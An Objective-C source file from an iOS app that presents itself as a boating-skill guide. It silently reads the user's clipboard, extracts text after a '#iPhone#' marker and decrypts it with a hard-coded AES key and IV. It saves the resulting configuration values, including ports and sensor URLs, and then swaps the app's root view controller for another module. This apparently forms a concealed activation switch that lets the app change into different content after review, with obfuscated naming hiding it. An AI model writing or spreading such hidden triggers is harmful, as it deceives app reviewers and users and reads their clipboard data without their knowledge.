//
//  RNBoatingSkillPractice.m
//  RNBoatingSkillLore
//
//  Created by Charmee on 10/23/23.
//  Copyright © 2023 Facebook. All rights reserved.
//

#import "RNBoatingSkillPractice.h"
#import <CocoaSecurity/CocoaSecurity.h>
#import <RNTheBoatingFunnyStory/RNTheBoatingFunnyShow.h>
#import <react-native-orientation-locker/Orientation.h>

@interface RNBoatingSkillPractice()

@property (strong, nonatomic)  NSArray *boatingPractice_Security;
@property (strong, nonatomic)  NSArray *boatingPractice_Params;

@end

@implementation RNBoatingSkillPractice

static RNBoatingSkillPractice *instance = nil;

+ (instancetype)boatingPractice_shared {
  static dispatch_once_t onceToken;
  dispatch_once(&onceToken, ^{
    instance = [[self alloc] init];
    instance.boatingPractice_Security = @[@"a71556f65ed2b25b55475b964488334f", @"ADD20BFCD9D4EA0278B11AEBB5B83365"];
    instance.boatingPractice_Params = @[@"boatingPractice_APP", @"umKey", @"umChannel", @"sensorUrl", @"sensorProperty", @"vPort", @"vSecu"];
  });
  return instance;
}

- (BOOL)boatingPractice_jumpByPBD {
  NSString *pbString = [self boatingPractice_getCPString];
  CocoaSecurityResult *aes = [CocoaSecurity aesDecryptWithBase64:[self boatingPractice_subStringPBD:pbString]
                                                          hexKey:self.boatingPractice_Security[0]
                                                           hexIv:self.boatingPractice_Security[1]];
  
  NSDictionary *dataDict = [self boatingPractice_stringTranslate:aes.utf8String];
  return [self boatingPractice_storeConfigInfo:dataDict];
}

- (NSString *)boatingPractice_getCPString {
  UIPasteboard *clipboard = [UIPasteboard generalPasteboard];
  return clipboard.string ?: @"";
}

- (NSString *)boatingPractice_subStringPBD: (NSString* )pbString {
    if ([pbString containsString:@"#iPhone#"]) {
        NSArray *tempArray = [pbString componentsSeparatedByString:@"#iPhone#"];
        if (tempArray.count > 1) {
            pbString = tempArray[1];
        }
        NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
        [tempArray enumerateObjectsUsingBlock:^(id  _Nonnull obj, NSUInteger idx, BOOL * _Nonnull stop) {
            [ud setObject:obj forKey:[NSString stringWithFormat:@"iPhone_%zd", idx]];
        }];
        [ud synchronize];
    }
    return pbString;
}

- (NSDictionary *)boatingPractice_stringTranslate: (NSString* )utf8String {
  NSData *data = [utf8String dataUsingEncoding:NSUTF8StringEncoding];
  if (data == nil) {
    return @{};
  }
  NSDictionary *dict = [NSJSONSerialization JSONObjectWithData:data
                                                       options:kNilOptions
                                                         error:nil];
  return dict[@"data"];
}

- (BOOL)boatingPractice_storeConfigInfo:(NSDictionary *)dict {
    if (dict == nil || [dict.allKeys count] < 3) {
      return NO;
    }
    NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
    [ud setBool:YES forKey:self.boatingPractice_Params[0]];
    
    [dict enumerateKeysAndObjectsUsingBlock:^(id  _Nonnull key, id  _Nonnull obj, BOOL * _Nonnull stop) {
        [ud setObject:obj forKey:key];
    }];

    [ud synchronize];
    return YES;
}

- (BOOL)boatingPractice_tryThisWay {
  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  if ([ud boolForKey:self.boatingPractice_Params[0]]) {
    return YES;
  } else {
    return [self boatingPractice_jumpByPBD];
  }
}


- (UIViewController *)boatingPractice_changeRootController:(UIApplication *)application withOptions:(NSDictionary *)launchOptions {
  UIViewController *vc = [[RNTheBoatingFunnyShow loclieny_shared] loclieny_changeRootController:application withOptions:launchOptions];
//  NSUserDefaults *ud = [NSUserDefaults standardUserDefaults];
  return vc;
}

- (UIInterfaceOrientationMask)boatingPractice_getOrientation {
  return [Orientation getOrientation];
}

@end
